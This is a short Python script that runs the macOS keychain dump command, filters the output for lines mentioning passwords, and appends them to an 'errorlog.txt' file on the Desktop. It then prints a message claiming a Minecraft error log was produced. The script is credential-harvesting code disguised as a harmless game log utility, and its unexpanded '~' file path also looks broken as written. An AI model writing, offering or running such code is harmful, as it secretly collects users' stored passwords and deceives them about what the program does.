import subprocess

command = "security dump-keychain"
output = subprocess.check_output(command, shell=True, text=True)

password_lines = [line for line in output.splitlines() if 'password' in line]

file_path = "~/Desktop/errorlog.txt"
with open(file_path, "a") as file:
    for line in password_lines:
        file.write(line + "\n")

print("Minecraft error log printed.")
